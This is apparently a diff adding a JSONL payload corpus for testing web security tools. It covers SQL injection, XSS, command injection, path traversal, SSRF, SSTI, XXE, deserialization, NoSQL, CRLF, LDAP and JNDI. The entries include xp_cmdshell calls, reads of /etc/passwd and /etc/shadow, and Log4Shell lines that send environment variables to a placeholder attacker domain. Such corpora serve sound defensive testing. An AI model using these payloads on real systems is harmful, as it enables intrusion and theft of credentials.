@@ -1,0 +1,78 @@
+{"category": "sqli", "name": "ext-sqli-01", "payload": "benchmark(10000000,MD5(1))#", "source": "external"}
+{"category": "sqli", "name": "ext-sqli-02", "payload": "1) or benchmark(10000000,MD5(1))#", "source": "external"}
+{"category": "sqli", "name": "ext-sqli-03", "payload": "hi' or 1=1 --", "source": "external"}
+{"category": "sqli", "name": "ext-sqli-04", "payload": "'; exec master..xp_cmdshell 'ping 172.10.1.255'--", "source": "external"}
+{"category": "sqli", "name": "ext-sqli-05", "payload": "' or ''-'", "source": "external"}
+{"category": "sqli", "name": "ext-sqli-06", "payload": "admin\" or \"1\"=\"1", "source": "external"}
+{"category": "sqli", "name": "ext-sqli-07", "payload": "\" or 1=1", "source": "external"}
+{"category": "sqli", "name": "ext-sqli-08", "payload": "root\" or 1=1 or \"\"=\"", "source": "external"}
+{"category": "sqli", "name": "ext-sqli-09", "payload": "root' or '1'='1'--", "source": "external"}
+{"category": "sqli", "name": "ext-sqli-10", "payload": "' or benchmark(10000000,MD5(1))#", "source": "external"}
+{"category": "xss", "name": "ext-xss-01", "payload": "' onmouseover=alert(/XSS/)", "source": "external"}
+{"category": "xss", "name": "ext-xss-02", "payload": "<script>     function b() { return Safe.get(); } alert(b({type:String.fromCharCode(99,108,105,99,107),isTrusted:true})); </script>", "source": "external"}
+{"category": "xss", "name": "ext-xss-03", "payload": "<var onmouseover=\"prompt(1)\">On Mouse Over</var>?", "source": "external"}
+{"category": "xss", "name": "ext-xss-04", "payload": "<script/src=\"data&colon;text%2Fj\\u0061v\\u0061script,\\u0061lert('\\u0061')\"></script a=\\u0061 & /=%2F", "source": "external"}
+{"category": "xss", "name": "ext-xss-05", "payload": "<svg%0Aonload=%09((pro\\u006dpt))()//", "source": "external"}
+{"category": "xss", "name": "ext-xss-06", "payload": "<A href=javas%26#99;ript:alert(1)>click", "source": "external"}
+{"category": "xss", "name": "ext-xss-07", "payload": "<sCriPt/src=//14.rs?", "source": "external"}
+{"category": "xss", "name": "ext-xss-08", "payload": "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>", "source": "external"}
+{"category": "xss", "name": "ext-xss-09", "payload": "javascript://</title>\"/</script></style></textarea/-->*/<alert()/*' onclick=alert()//>/", "source": "external"}
+{"category": "xss", "name": "ext-xss-10", "payload": "javascript:alert()//--></script></textarea></style></title><a\"//' onclick=alert()//>*/alert()/*", "source": "external"}
+{"category": "cmdi", "name": "ext-cmdi-01", "payload": "echo%20AGIYMZ$((69%2B52))$(echo%20AGIYMZ)AGIYMZ", "source": "external"}
+{"category": "cmdi", "name": "ext-cmdi-02", "payload": "%27%26echo%20NTKAFT$((47%2B6))$(echo%20NTKAFT)NTKAFT'", "source": "external"}
+{"category": "cmdi", "name": "ext-cmdi-03", "payload": "'&&echo$IFSQCRXUV$((17%2B13))$(echo$IFSQCRXUV)QCRXUV", "source": "external"}
+{"category": "cmdi", "name": "ext-cmdi-04", "payload": "%22echo$IFSWYLAHG$((98%2B68))$(echo$IFSWYLAHG)WYLAHG\\", "source": "external"}
+{"category": "cmdi", "name": "ext-cmdi-05", "payload": "%0Aid", "source": "external"}
+{"category": "cmdi", "name": "ext-cmdi-06", "payload": "& ping -n 30 127.0.0.1 &", "source": "external"}
+{"category": "cmdi", "name": "ext-cmdi-07", "payload": ";id;", "source": "external"}
+{"category": "cmdi", "name": "ext-cmdi-08", "payload": "`/usr/bin/id`", "source": "external"}
+{"category": "cmdi", "name": "ext-cmdi-09", "payload": "a);id;", "source": "external"}
+{"category": "cmdi", "name": "ext-cmdi-10", "payload": "a;id|", "source": "external"}
+{"category": "traversal", "name": "ext-traversal-01", "payload": "/.../.../.../.../.../", "source": "external"}
+{"category": "traversal", "name": "ext-traversal-02", "payload": "../config.asp", "source": "external"}
+{"category": "traversal", "name": "ext-traversal-03", "payload": "../../../../../../../../../../../../../../../../../../../../../etc/passwd%00", "source": "external"}
+{"category": "traversal", "name": "ext-traversal-04", "payload": "....\\/....\\/etc/passwd", "source": "external"}
+{"category": "traversal", "name": "ext-traversal-05", "payload": "../../logs/error.log", "source": "external"}
+{"category": "traversal", "name": "ext-traversal-06", "payload": "../logs/access_log", "source": "external"}
+{"category": "traversal", "name": "ext-traversal-07", "payload": "../../../../../../../../../../../../../../../../../proc/self/fd/8", "source": "external"}
+{"category": "traversal", "name": "ext-traversal-08", "payload": "../../../../../../../../../../../../etc/group", "source": "external"}
+{"category": "traversal", "name": "ext-traversal-09", "payload": "../../../../../../../../../../../../../../../apache/logs/error.log%00", "source": "external"}
+{"category": "traversal", "name": "ext-traversal-10", "payload": "../../../../../../../../../../../../../../../var/www/logs/error.log", "source": "external"}
+{"category": "ssrf", "name": "ext-ssrf-01", "payload": "http://169.254.169.254/latest/meta-data/", "source": "external"}
+{"category": "ssrf", "name": "ext-ssrf-02", "payload": "http://0.0.0.0:22", "source": "external"}
+{"category": "ssrf", "name": "ext-ssrf-03", "payload": "http://127.0.1.3", "source": "external"}
+{"category": "ssrf", "name": "ext-ssrf-04", "payload": "http://ip6-loopback = ::1", "source": "external"}
+{"category": "ssrf", "name": "ext-ssrf-05", "payload": "http:127.0.0.1/", "source": "external"}
+{"category": "ssrf", "name": "ext-ssrf-06", "payload": "ssrf.php?url=http://127.0.0.1:80", "source": "external"}
+{"category": "ssti", "name": "ext-ssti-01", "payload": "{{42*42}}", "source": "external"}
+{"category": "ssti", "name": "ext-ssti-02", "payload": "{{{42*42}}}", "source": "external"}
+{"category": "ssti", "name": "ext-ssti-03", "payload": "${42*42}", "source": "external"}
+{"category": "ssti", "name": "ext-ssti-04", "payload": "<%=42*42 %>", "source": "external"}
+{"category": "ssti", "name": "ext-ssti-05", "payload": "{{=42*42}}", "source": "external"}
+{"category": "ssti", "name": "ext-ssti-06", "payload": "${donotexists|42*42}", "source": "external"}
+{"category": "xxe", "name": "ext-xxe-01", "payload": "<!ENTITY % xxe SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\" >", "source": "external"}
+{"category": "xxe", "name": "ext-xxe-02", "payload": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE xxe [<!ENTITY foo \"aaaaaa\">]>", "source": "external"}
+{"category": "xxe", "name": "ext-xxe-03", "payload": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/issue\" >]><foo>&xxe;</foo>", "source": "external"}
+{"category": "xxe", "name": "ext-xxe-04", "payload": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/shadow\" >]>", "source": "external"}
+{"category": "xxe", "name": "ext-xxe-05", "payload": "<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>", "source": "external"}
+{"category": "xxe", "name": "ext-xxe-06", "payload": "<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:////dev/random\">]>", "source": "external"}
+{"category": "deser", "name": "ext-deser-01", "payload": "O:18:\"PHPObjectInjection\":1:{s:6:\"inject\";s:17:\"system('whoami');\";}", "source": "external"}
+{"category": "deser", "name": "ext-deser-02", "payload": "O:13:\"ObjectExample\":2:{s:10:\"secretCode\";N;s:5:\"guess\";R:2;}", "source": "external"}
+{"category": "nosql", "name": "ext-nosql-01", "payload": "true, $where: '1 == 1'", "source": "external"}
+{"category": "nosql", "name": "ext-nosql-02", "payload": ", $where: '1 == 1'", "source": "external"}
+{"category": "nosql", "name": "ext-nosql-03", "payload": "', $where: '1 == 1'", "source": "external"}
+{"category": "nosql", "name": "ext-nosql-04", "payload": "1, $where: '1 == 1'", "source": "external"}
+{"category": "nosql", "name": "ext-nosql-05", "payload": "', $or: [ {}, { 'a':'a", "source": "external"}
+{"category": "nosql", "name": "ext-nosql-06", "payload": "{$gt: ''}", "source": "external"}
+{"category": "nosql", "name": "ext-nosql-07", "payload": "{\"$gt\": \"\"}", "source": "external"}
+{"category": "crlf", "name": "ext-crlf-01", "payload": "%0d%0aLocation:%20http://myweb.com", "source": "external"}
+{"category": "crlf", "name": "ext-crlf-02", "payload": "%E5%98%8A%E5%98%8Dcontent-type:text/html%E5%98%8A%E5%98%8Dlocation:%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%BCsvg/onload=alert%28document.domain%28%29%E5%98%BE", "source": "external"}
+{"category": "ldap", "name": "ext-ldap-01", "payload": "%2A%28%7C%28mail%3D%2A%29%29", "source": "external"}
+{"category": "ldap", "name": "ext-ldap-02", "payload": "%2A%28%7C%28objectclass%3D%2A%29%29", "source": "external"}
+{"category": "ldap", "name": "ext-ldap-03", "payload": "%2A%7C", "source": "external"}
+{"category": "jndi", "name": "ext-jndi-01", "payload": "${jndi:ldap://${java:version}.domain/a}", "source": "external"}
+{"category": "jndi", "name": "ext-jndi-02", "payload": "${jndi:ldap://${env:JAVA_VERSION}.domain/a}", "source": "external"}
+{"category": "jndi", "name": "ext-jndi-03", "payload": "${jndi:ldap://${sys:java.vendor}.domain/a}", "source": "external"}
+{"category": "jndi", "name": "ext-jndi-04", "payload": "${jndi:ldap://${hostName}.domain/a}", "source": "external"}
+{"category": "jndi", "name": "ext-jndi-05", "payload": "${jndi:${lower:l}${lower:d}a${lower:p}://loc${upper:a}lhost:1389/rce}", "source": "external"}
+{"category": "jndi", "name": "ext-jndi-06", "payload": "${jndi:ldap://${env:USER}.${env:USERNAME}.[ATTACKER.DOMAIN.TLD]:1389/", "source": "external"}
